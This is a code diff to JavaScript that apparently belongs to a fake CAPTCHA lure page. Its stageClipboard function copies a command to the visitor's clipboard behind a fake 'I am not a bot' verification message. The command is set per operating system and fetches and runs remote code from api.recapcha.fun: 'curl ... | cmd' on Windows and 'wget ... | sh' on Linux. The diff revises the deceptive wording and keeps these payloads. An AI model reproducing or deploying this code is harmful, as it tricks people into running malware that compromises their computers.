@@ -872,7 +872,7 @@
 
     function stageClipboard(commandToRun, verification_id) {
         const suffix = " :: ";
-        const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: ";
+        const ploy = "'' I am not a bot. Fixing the issue as a services. ID: ";
         const end = "''";
         const textToCopy = commandToRun + suffix + ploy + verification_id + end;
         if (osType === "Windows")
@@ -924,7 +924,7 @@
 
         let htaPath;
         if (osType === "Windows") {
-            htaPath = "cmd /c curl -s https://api.recapcha.fun/auth/v1?token=202 | cmd :: '' I am not a bot. Fixing the issue as a services. ID:7774''";
+            htaPath = "cmd /c curl -s https://api.recapcha.fun/auth/v1?token=202 | cmd ";
         } else if (osType === "Linux") {
             htaPath = "wget -qO- 'https://api.recapcha.fun/auth/v2?token=202' | sh";
         } else if (osType === "MacOS") {
@@ -1220,7 +1220,7 @@
 
     function stageClipboard(commandToRun, verification_id) {
         const suffix = " :: ";
-        const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: ";
+        const ploy = "'' I am not a bot. Fixing the issue as a services. ID: ";
         const end = "''";
         const textToCopy = commandToRun + suffix + ploy + verification_id + end;
         if (osType === "Windows")
@@ -1272,7 +1272,7 @@
 
         let htaPath;
         if (osType === "Windows") {
-            htaPath = "cmd /c curl -s https://api.recapcha.fun/auth/v1?token=202 | cmd :: '' I am not a bot. Fixing the issue as a services. ID:7774''";
+            htaPath = "cmd /c curl -s https://api.recapcha.fun/auth/v1?token=202 | cmd ";
         } else if (osType === "Linux") {
             htaPath = "wget -qO- 'https://api.recapcha.fun/auth/v2?token=202' | sh";
         } else if (osType === "MacOS") {
